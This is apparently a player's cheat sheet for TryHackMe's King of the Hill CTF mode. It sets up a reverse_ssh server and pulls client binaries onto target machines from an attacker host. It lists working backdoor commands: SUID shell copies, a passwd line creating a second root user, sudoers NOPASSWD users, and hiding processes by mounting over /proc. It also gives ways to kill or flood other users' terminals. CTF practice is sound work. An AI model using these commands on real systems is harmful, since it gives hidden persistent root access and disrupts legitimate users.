# THM King of the Hill Guides

These are cheat sheets I put together during my sting playing TryHackMe's King of the Hill mode. It can be quite fun, though if the other players know the machine and you don't, then how well you do entirely depends on how much they let you do. Nevertheless I found *most* players were accommodating enough that I was able to fully enumerate every machine, and these kill sheets are derived from that alone (except for H1: Hard, which is er, really hard - needed a walkthrough for that one).

My recommendation to you if you are new? Try and enumerate yourself. Once root on a machine, use that access to run linpeas, check sudoers etc and find the other ways in. A lot of fun I had was just from find the nooks and crannies on each machine, rather than any competitive aspect.

## A Note on Reverse SSH

Most of my kill sheets were tailored to my hacking approach, which was to start a [Reverse SSH](https://github.com/NHAS/reverse_ssh) server on my machine via the following commands (update go, create ssh keys, setup server):

```
wget -q https://go.dev/dl/go1.18.linux-amd64.tar.gz && rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.linux-amd64.tar.gz && rm go1.18.linux-amd64.tar.gz
ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null
git clone https://github.com/NHAS/reverse_ssh && cd reverse_ssh && git checkout unstable && RSSH_HOMESERVER=$(hostname -i):3232 make && cd bin/ && cp ~/.ssh/id_ed25519.pub authorized_keys && cp client* ~/ && ./server --external_address $(hostname -i):3232 :3232 &
```

(note the above is done as part of my [thm-setup.sh](../thm-setup.sh) script as well)

After setting up the server, I would set up a python webserver on port 1234 to made the client binaries available, and then pull and run these on various machines. So in a kill sheet, if you see a `LHOST:1234/client` set of instructions that is what it is doing.

What is the advantage of reverse_ssh? It gives an immediate fully stable shell on linux *AND* windows, communicates over its own channel so even if the SSH server on the machine is completely disabled it will still work, and doesn't rely on passwords, ssh keys that another user might delete etc. Very nice.

## General tips and tricks

- when you ssh into a machine (regular or via reverse_ssh), the argument `-T` will not create a /dev/pts/ file. This prevents you showing up in `who` or `pinky`, which can stop those assholes who like to kill shells or cat random data or nyan cat into your terminal
- any process can be hidden by mounting over it. e.g. if you have a bash process running, and you know its PID is 2385 for example, `mount -o bind /tmp /proc/2838` will hide it, meaning your process will not show when `ps aux` is run. note this can be easily seen by running `mount` as a super user.
- when root, if facing an adversarial opponent who is likely to close all major paths to root, create lots of ways of getting back:
  - creating more suid binaries, e.g. `cp /bin/sh /home/sh && chmod u+s /home/sh`
  - adding your public key to /root/.ssh/authorized_keys
  - changing the root password
  - running reverse_ssh binaries
  - adding new users to /etc/passwd, e.g. `echo 'user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash' >> /etc/passwd` will create basically a second root user, with password `pass123`
  - creating a user who can sudo to root: `useradd aquinas && (echo -e "thisisatest\nthisisatest" | passwd aquinas) && (echo "aquinas ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)`
- you can wipe other sessions with something like this: `/bin/ls /dev/pts/* | /usr/bin/cut -c 6- | /usr/bin/xargs -I T pkill -9 -t T`. Note this only works against people who *have* a pts, e.g. didn't use `-T`. And I suggest only using it after someone has tried to kill your session. Don't be a dick.
- if someone is being really annoying, cat `/dev/urandom > /dev/pts/[id] &` is the nuclear option: the stream of random data will likely ruin their entire terminal. It'll keep running until they give up, at which point you will get a file read/write error or something.

## King Persistence

Aside from being root and kicking other users off like a wanker, the true troll just focuses on controlling king.txt. Let them be root, let everyone be root! They still can't become king if they can't figure out how to update the file. My approach for this is to escalate based on what I'm facing, e.g. the following tiers:

1. just put your name in king.txt
2. make it immutable: `/usr/bin/chattr +i king.txt` on linux and `attrib +r king.txt` on windows
3. delete chattr (its allowed). on windows you can't delete attrib even as system, but you could use `attrib +s king.txt` to also make it a system file to further harden it
4. create a bash loop to keep yourself as king. this works: `while true; do (echo Aquinas > /root/king.txt); sleep 0.1; done 2>/dev/null &`. Note, dont put this in a file and run it - I *will* find your file and put my name in it, plus the whole command will show up under PS. Running straight in your terminal will likely only show sleep 0.1. sleep could even be omitted, but it has the advantage that if they use pspy64 to try and figure out whats going on they will see a wall of sleep commands.
5. drop the 'nuclear option': this is a binary I call [kingmaker](tools/kingmaker.c), which combines chattr plus setting the file content plus stealth to make it very hard to find - only one person I've played where it has come to this has managed to find and kill the process, props to him (flint)

There is dickery beyond this thats possible, i.e. doing something violent with LD_PRELOAD, but I've never seen the point.

Defense tips:

- despite the sleep wall thing I mentioned, [pspy64](https://github.com/DominicBreuker/pspy) is a good tool to see whats happening, it will often find sneaky binaries that are being run etc
- chattr gets deleted all the time; some people then pull on a copy of it from busybox; I've seen obfuscation of this by naming it all sorts of things. Remember it will usually have the same *size*, something like `find / -size 36464c 2>/dev/null` willt rack it down.
- in the same vein, why not be extra sneaky and just create your own! I wrote [mf.c](tools/mf.c), which performs the same function as chattr and is trivial to compile and copy across. You can even use it in a loop to keep king mutable: `while true; do (/mf /root/king.txt 0); sleep 0.1; done &` (or immutable, if you wish, via subbing `16` for `0`).

